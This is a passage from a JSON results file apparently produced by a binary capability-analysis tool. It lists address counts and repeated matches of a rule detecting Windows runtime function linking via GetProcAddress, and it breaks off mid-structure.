                "value": 1651803376
              },
              "count": 51
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651803600
              },
              "count": 43
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651803856
              },
              "count": 26
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651803904
              },
              "count": 45
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651804048
              },
              "count": 7
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651804064
              },
              "count": 34
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651804176
              },
              "count": 117
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651804704
              },
              "count": 114
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651805456
              },
              "count": 60
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651805904
              },
              "count": 59
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651806160
              },
              "count": 72
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651806592
              },
              "count": 37
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651806704
              },
              "count": 40
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651806832
              },
              "count": 33
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651806976
              },
              "count": 50
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651807200
              },
              "count": 25
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651807232
              },
              "count": 27
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651807264
              },
              "count": 47
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651807344
              },
              "count": 60
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651807504
              },
              "count": 56
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651807648
              },
              "count": 35
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651807696
              },
              "count": 55
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651807808
              },
              "count": 28
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651807856
              },
              "count": 60
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808000
              },
              "count": 63
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808192
              },
              "count": 7
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808208
              },
              "count": 25
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808288
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808296
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808304
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808312
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808320
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808328
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808336
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808344
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808352
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808360
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808368
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808376
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808384
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808392
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808400
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808408
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808416
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808424
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808432
              },
              "count": 7
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808440
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808448
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808464
              },
              "count": 23
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808512
              },
              "count": 65
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808736
              },
              "count": 44
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808864
              },
              "count": 28
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808896
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808904
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808912
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808920
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651808928
              },
              "count": 65
            }
          ]
        },
        "library_functions": [
          {
            "address": {
              "type": "absolute",
              "value": 1651808272
            },
            "name": "?"
          }
        ]
      }
    },
    "rules": {
      "link function at runtime on Windows": {
        "meta": {
          "name": "link function at runtime on Windows",
          "namespace": "linking/runtime-linking",
          "authors": [
            "moritz.raabe@mandiant.com",
            "mehunhoff@google.com"
          ],
          "scopes": {
            "static": "instruction",
            "dynamic": "call"
          },
          "attack": [
            {
              "parts": [
                "Execution",
                "Shared Modules"
              ],
              "tactic": "Execution",
              "technique": "Shared Modules",
              "subtechnique": "",
              "id": "T1129"
            }
          ],
          "mbc": [],
          "references": [],
          "examples": [
            "9324D1A8AE37A36AE560C37448C9705A:0x404130",
            "Practical Malware Analysis Lab 01-04.exe_:0x401350"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: link function at runtime on Windows\r\n    namespace: linking/runtime-linking\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - mehunhoff@google.com\r\n    scopes:\r\n      static: instruction\r\n      dynamic: call\r\n    att&ck:\r\n      - Execution::Shared Modules [T1129]\r\n    examples:\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x404130\r\n      - Practical Malware Analysis Lab 01-04.exe_:0x401350\r\n  features:\r\n    - and:\r\n      - os: windows\r\n      - or:\r\n        - api: kernel32.GetProcAddress\r\n        - api: ntdll.LdrGetProcedureAddress\r\n        - api: ntdll.LdrGetProcedureAddressEx\r\n        - api: ntdll.LdrGetProcedureAddressForCaller\r\n        - api: MmGetSystemRoutineAddress\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651775921
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651775921
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651775985
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651775985
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651776049
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651776049
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651776193
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651776193
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651776782
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651776782
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651776910
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651776910
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651778305
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651778305
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651778369
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651778369
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651778433
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651778433
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651778497
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651778497
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651778561
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651778561
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651778625
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651778625
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651778689
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651778689
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651778753
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651778753
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
